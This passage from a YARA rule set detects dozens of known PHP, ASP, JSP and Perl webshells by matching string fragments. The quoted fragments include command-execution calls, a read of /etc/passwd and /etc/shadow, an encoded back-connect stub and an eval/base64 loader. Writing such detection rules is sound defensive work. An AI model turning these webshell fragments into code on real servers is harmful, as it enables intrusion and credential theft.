      $s1 = "http://c0derz.org.ua" 
      $s2 = "vint21h@c0derz.org.ua" 
      $s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root" 
   condition: 
      1 of them
} 

rule Webshell_pHpINJ_php_php_RID2FFD : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file pHpINJ.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:20:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "News Remote PHP Shell Injection" 
      $s3 = "Php Shell <br />" fullword
      $s4 = "<input type = \"text\" name = \"url\" value = \"" 
   condition: 
      2 of them
} 

rule Webshell_sig_2008_php_php_RID3060 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file 2008.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:37:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Codz by angel(4ngel)" 
      $s1 = "Web: http://www.4ngel.net" 
      $s2 = "$admin['cookielife'] = 86400;" 
      $s3 = "$errmsg = 'The file you want Downloadable was nonexistent';" 
   condition: 
      1 of them
} 

rule Webshell_ak74shell_php_php_RID3143 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file ak74shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:15:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION[" 
      $s2 = "AK-74 Security Team Web Site: www.ak74-team.net" 
      $s3 = "$xshell" 
   condition: 
      2 of them
} 

rule Webshell_zacosmall_php_RID3013 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file zacosmall.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:24:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "rand(1,99999);$sj98" 
      $s1 = "$dump_file.='`'.$rows2[0].'`" 
      $s3 = "filename=\\\"dump_{$db_dump}_${table_d" 
   condition: 
      2 of them
} 

rule Webshell_CmdAsp_asp_RID2E81 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file CmdAsp.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:17:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "CmdAsp.asp" 
      $s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
      $s2 = "-- Use a poor man's pipe ... a temp file --" 
      $s3 = "maceo @ dogmile.com" 
   condition: 
      2 of them
} 

rule Webshell_mysql_shell_php_RID30FA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file mysql_shell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:02:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "SooMin Kim" 
      $s1 = "smkim@popeye.snu.ac.kr" 
      $s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen" 
   condition: 
      1 of them
} 

rule Webshell_backup_php_often_with_c99shell_RID36A5 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file backup.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 17:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "#phpMyAdmin MySQL-Dump" fullword
      $s2 = ";db_connect();header('Content-Type: application/octetstr" 
      $s4 = "$data .= \"#Database: $database" fullword
   condition: 
      all of them
} 

rule Webshell_Reader_asp_RID2E9C : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Reader.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:21:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Mehdi & HolyDemon" 
      $s2 = "www.infilak." 
      $s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%" 
   condition: 
      2 of them
} 

rule Webshell_jspshall_jsp_RID2FB3 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file jspshall.jsp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:08:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "kj021320" 
      $s1 = "case 'T':systemTools(out);break;" 
      $s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file" 
   condition: 
      2 of them
} 

rule Webshell_Webshell_php_Blocker_RID32A4 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file webshell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:13:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "<die(\"Couldn't Read directory, Blocked!!!\");" 
      $s3 = "PHP Web Shell" 
   condition: 
      all of them
} 

rule Webshell_shells_PHP_wso_RID3030 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file wso.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:29:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi" 
      $s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos" 
   condition: 
      1 of them
} 

rule Webshell_indexer_asp_RID2F38 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file indexer.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:47:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ" 
      $s2 = "D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit" 
   condition: 
      1 of them
} 

rule Webshell_DxShell_php_php_RID30A8 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file DxShell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:49:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx" 
      $s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><" 
   condition: 
      1 of them
} 

rule Webshell_kacak_asp_RID2E44 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file kacak.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:07:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Kacak FSO 1.0" 
      $s1 = "if request.querystring(\"TGH\") = \"1\" then" 
      $s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style=" 
      $s4 = "mailto:BuqX@hotmail.com" 
   condition: 
      1 of them
} 

rule Webshell_PHP_Backdoor_Connect_pl_php_RID351D : DEMO MAL T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file PHP Backdoor Connect.pl.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "LorD of IRAN HACKERS SABOTAGE" 
      $s1 = "LorD-C0d3r-NT" 
      $s2 = "echo --==Userinfo==-- ;" 
   condition: 
      1 of them
} 

rule Webshell_Antichat_Shell_v1_3_php_RID3368 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Antichat Shell v1.3.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:46:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Antichat" 
      $s1 = "Can't open file, permission denide" 
      $s2 = "$ra44" 
   condition: 
      2 of them
} 

rule Webshell_cmd_asp_5_1_asp_RID3044 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file cmd-asp-5.1.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:32:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
      $s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
   condition: 
      1 of them
} 

rule Webshell_PHP_Shell_php_php_RID3133 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file PHP Shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:12:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input" 
      $s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=" 
   condition: 
      all of them
} 

rule Webshell_EFSO_2_asp_RID2E07 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file EFSO_2.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:57:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Ejder was HERE" 
      $s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~" 
   condition: 
      2 of them
} 

rule Webshell_lamashell_php_RID3000 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file lamashell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "lama's'hell" fullword
      $s1 = "if($_POST['king'] == \"\") {" 
      $s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f" 
   condition: 
      1 of them
} 

rule Webshell_Sincap_php_php_RID3052 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Sincap.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:34:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');" 
      $s2 = "$tampon4=$tampon3-1" 
      $s3 = "@aventgrup.net" 
   condition: 
      2 of them
} 

rule Webshell_Test_php_php_RID2F94 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Test.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:03:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$yazi = \"test\" . \"\\r\\n\";" fullword
      $s2 = "fwrite ($fp, \"$yazi\");" fullword
      $s3 = "$entry_line=\"HACKed by EntriKa\";" fullword
   condition: 
      1 of them
} 

rule Webshell_Zehir_4_asp_RID2EDE : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Zehir 4.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:32:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time=" 
      $s4 = "<input type=submit value=\"Test Et!\" onclick=\"" 
   condition: 
      1 of them
} 

rule Webshell_sh_php_php_RID2ECF : DEMO T1087 T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file sh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:30:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1087, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e" 
      $s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:" 
   condition: 
      1 of them
} 

rule Webshell_phpjackal_php_RID2FFB : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file phpjackal.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:20:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "$dl=$_REQUEST['downloaD'];" 
      $s4 = "else shelL(\"perl.exe $name $port\");" 
   condition: 
      1 of them
} 

rule Webshell_sql_php_php_RID2F44 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file sql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#" 
      $s2 = "http://rst.void.ru" 
      $s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&" 
   condition: 
      1 of them
} 

rule Webshell_cgi_python_py_RID3022 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file cgi-python.py.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:26:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "a CGI by Fuzzyman" 
      $s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + " 
      $s2 = "values = map(lambda x: x.value, theform[field])     # allows for" 
   condition: 
      1 of them
} 

rule Webshell_telnetd_pl_RID2ED1 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file telnetd.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:30:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "0ldW0lf" fullword
      $s1 = "However you are lucky :P" 
      $s2 = "I'm FuCKeD" 
      $s3 = "ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#" 
      $s4 = "atrix@irc.brasnet.org" 
   condition: 
      1 of them
} 

rule Webshell_telnet_cgi_RID2EC4 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file telnet.cgi.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:28:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "W A R N I N G: Private Server" 
      $s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie" 
      $s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C" 
   condition: 
      1 of them
} 

rule Webshell_ironshell_php_RID301D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file ironshell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:26:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "www.ironwarez.info" 
      $s1 = "$cookiename = \"wieeeee\";" 
      $s2 = "~ Shell I" 
      $s3 = "www.rootshell-team.info" 
      $s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);" 
   condition: 
      1 of them
} 

rule Webshell_backdoorfr_php_RID306A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file backdoorfr.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:38:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan" 
      $s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc" 
   condition: 
      1 of them
} 

rule Webshell_aspydrv_asp_RID2F52 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file aspydrv.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:52:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))" 
      $s1 = "password" 
      $s2 = "session(\"shagman\")=" 
   condition: 
      2 of them
} 

rule Webshell_h4ntu_shell__powered_by_tsoi__RID367B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file h4ntu shell [powered by tsoi].txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 16:57:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "h4ntu shell" 
      $s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");" 
   condition: 
      1 of them
} 

rule Webshell_Ajan_asp_RID2DC3 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Ajan.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "c:\\downloaded.zip" 
      $s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
      $s3 = "http://www35.websamba.com/cybervurgun/" 
   condition: 
      1 of them
} 

rule Webshell_PHANTASMA_php_RID2EEA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file PHANTASMA.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:34:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = ">[*] Safemode Mode Run</DIV>" 
      $s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>" 
      $s2 = "[*] Spawning Shell" 
      $s3 = "Cha0s" 
   condition: 
      2 of them
} 

rule Webshell_SpecialShell_99a_RID3091 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated "
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$sess_data[\"cut\"] = array(); c99_s" 
      $s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))" 
   condition: 
      1 of them
} 

rule Webshell_c99shell_v1_0_SsEs_RID3105 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}" fullword
   condition: 
      1 of them
} 

rule Webshell_c99_generic2_RID2EE9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated "
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:34:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = " if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":" 
      $s1 = " $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";" fullword
   condition: 
      all of them
} 

rule Webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_php_RID4390 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 02:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt" 
      $s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass" 
      $s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword
   condition: 
      1 of them
} 

rule Webshell_Nshell__1__php_php_RID31A8 : DEMO T1033 T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Nshell (1).php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1033, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($" 
      $s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword
   condition: 
      1 of them
} 

rule Webshell_shankar_php_php_RID30DC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file shankar.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:57:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $sAuthor = "ShAnKaR" 
      $s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input" 
      $s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b" 
   condition: 
      1 of ( $s* ) and $sAuthor
} 

rule Webshell_Casus15_php_php_RID3059 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Casus15.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:36:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na" 
      $s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'" 
      $s3 = "value='Calistirmak istediginiz " 
   condition: 
      1 of them
} 

rule Webshell_small_php_php_RID300D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file small.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:23:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
      $s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1" 
      $s4 = "@ini_set('error_log',NULL);" fullword
   condition: 
      2 of them
} 

rule Webshell_fuckphpshell_php_RID3156 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file fuckphpshell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$succ = \"Warning! " 
      $s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!" 
      $s2 = "\\*=-- MEMBERS AREA --=*/" 
      $s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o" 
   condition: 
      2 of them
} 

rule Webshell_ngh_php_php_RID2F31 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file ngh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Cr4sh_aka_RKL" 
